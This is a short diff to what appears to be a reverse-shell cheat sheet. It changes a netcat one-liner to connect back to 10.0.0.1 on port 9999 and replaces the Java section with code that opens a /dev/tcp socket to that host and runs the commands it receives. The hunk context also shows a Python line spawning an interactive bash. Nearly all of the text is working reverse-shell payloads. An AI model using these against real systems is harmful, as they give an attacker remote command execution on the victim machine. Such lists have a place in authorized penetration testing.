@@ -47,12 +47,14 @@ p=subprocess.call(["/bin/bash","-i"]);
 
 # Netcat
 ```
-nc -e /bin/sh 10.0.0.1 1234
+nc -e /bin/sh 10.0.0.1 9999
 ```
 ###
 
 # Java
 ```
-nc -e /bin/sh 10.0.0.1 1234
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/9999;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
 ```
 ###
